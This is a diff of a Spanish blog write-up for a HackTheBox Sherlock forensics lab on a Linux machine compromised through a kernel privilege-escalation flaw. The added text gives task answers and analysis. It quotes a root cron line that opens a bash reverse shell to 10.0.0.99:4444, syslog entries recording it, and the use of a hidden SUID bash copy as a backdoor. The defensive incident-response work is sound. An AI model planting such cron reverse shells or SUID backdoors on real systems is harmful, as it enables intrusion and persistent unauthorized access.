@@ -1,7 +1,42 @@
-
-
+---
+layout: single
+title: Sherlock - DirtyFrag
+excerpt: Laboratorio sobre un entorno linux comprometido con una vulnerabilidad de escalada privilegios reciente
+date: 2026-9-30
+classes: wide
+header:
+   teaser: ../assets/images/logoletsdefend.png
+   teaser_home_page: true
+   icon: ../assets/images/hackthebox.webp
+categories:
+   - hackthebox
+   - soc
+   - blue team
+   - dfir
 tags:
-dmesg
+   - dmesg
+   - linux
+   - dfir
+   - dirtyfrag
+   - cve-2026-43284
+   - forensics
+   - incident-response
+   - dirtyfrag
+   - cve-2026-43284
+   - privilege-escalation
+   - page-cache-corruption
+   - kernel-logs
+   - dmesg
+   - xfrm
+   - ipsec-esp
+   - setuid
+   - suid-backdoor
+   - persistence
+   - cron
+   - reverse-shell
+   - shadow-file
+   - hackthebox
+   - threat-hunting
 ---
 
 **Sherlock Sceario: A Linux workstation running Ubuntu 22.04.2 LTS was compromised through a kernel vulnerability in the IPsec (ESP/XFRM) subsystem. The attacker created a new user account, exploited the kernel flaw to escalate privileges, deployed a hidden SUID backdoor binary, and installed a malicious root cron job that establishes a reverse shell to a remote host. Kernel logs, user account records, file permissions, and cron entries were collected from the compromised machine for forensic analysis.**
@@ -228,6 +263,15 @@ Analizando los permisos del binario:
 6755 -rwsr-sr-x kali:kali var/tmp/.syshelper
 ```
 
+Los permisos son `6755`.
+
+Fijándonos bien, el binario malicioso tiene un tamaño similar con una copia de bash:
+
+```txt
+-rwxr-xr-x 1 root root 1384752 May  3 19:28 /usr/bin/bash
+```
+
+Comparando los hashes del binario malicioso con el `/usr/bash` del sistema de archivos de la víctima:
 
 ```bash
 ┌──(kali㉿kali)-[/mnt/dirtyfrag]
@@ -237,19 +281,21 @@ Analizando los permisos del binario:
 ┌──(kali㉿kali)-[/mnt/dirtyfrag]
 └─$ sha256sum var/tmp/.syshelper
 2c336c63e26881d2f02f34379024e7c314bce572c08cbaa319bacbbec29f93ed  var/tmp/.syshelper
-``` 
+```
 
-number, such as 3, 17, or 4567
+Con esto, cualquier usuario local obtiene una shell con la identidad del dueño con `/var/tmp/.syshelper -p`.
 
-Submit Task
-Task 12
-What is the SHA256 hash of the hidden SUID binary?
+-------
 
-SHA-256 Hash
+**12\. What is the SHA256 hash of the hidden SUID binary?**
 
-Submit Task
-Task 13
-What is the exact full line of the malicious cron entry? Include every field from the schedule to the end of the command.
+Como ya vimos en la pregunta anterior: `2c336c63e26881d2f02f34379024e7c314bce572c08cbaa319bacbbec29f93ed`
+
+---------
+
+**13\. What is the exact full line of the malicious cron entry? Include every field from the schedule to the end of the command.**
+
+Leyendo el `crontab`:
 
 ```bash
 ┌──(kali㉿kali)-[/mnt/dirtyfrag]
@@ -278,5 +324,20 @@ SHELL=/bin/sh
 52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
 #
 * * * * * root /bin/bash -i >& /dev/tcp/10.0.0.99/4444 0>&1
-
 ```
+
+Se manda una reverse shell cada minuto a `10.0.0.99:4444`
+
+Confirmamos la ejecución de la reverse shell:
+
+```bash
+┌──(kali㉿kali)-[/mnt/dirtyfrag]
+└─$ grep CRON var/syslog | grep -i "10.0.0.99"
+May 17 09:37:01 local CRON[4961]: (root) CMD (/bin/bash -i >& /dev/tcp/10.0.0.99/4444 0>&1)
+May 17 09:38:01 local CRON[5020]: (root) CMD (/bin/bash -i >& /dev/tcp/10.0.0.99/4444 0>&1)
+May 17 09:39:01 local CRON[5075]: (root) CMD (/bin/bash -i >& /dev/tcp/10.0.0.99/4444 0>&1)
+May 17 09:40:01 local CRON[5078]: (root) CMD (/bin/bash -i >& /dev/tcp/10.0.0.99/4444 0>&1)
+May 17 09:41:01 local CRON[5091]: (root) CMD (/bin/bash -i >& /dev/tcp/10.0.0.99/4444 0>&1) 
+```
+
+
